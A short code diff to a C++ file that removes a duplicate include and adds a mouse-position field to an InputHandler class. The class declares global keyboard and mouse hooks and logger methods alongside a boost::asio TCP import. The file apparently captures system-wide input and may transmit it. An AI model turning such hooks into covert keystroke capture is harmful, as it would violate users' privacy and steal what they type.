@@ -9,7 +9,6 @@
 #include <thread>
 #include <iostream>
 #include <cstdlib>
-#include <thread>
 #include <bitset>
 
 using boost::asio::ip::tcp;
@@ -19,6 +18,7 @@ class InputHandler
 public:
 	HHOOK hKeyboardHook;
 	HHOOK hMouseHook;
+	POINT mousePosition;
 	static InputHandler& Instance();
 	void MyMouseLogger();
 	void MyKeyboardLogger();
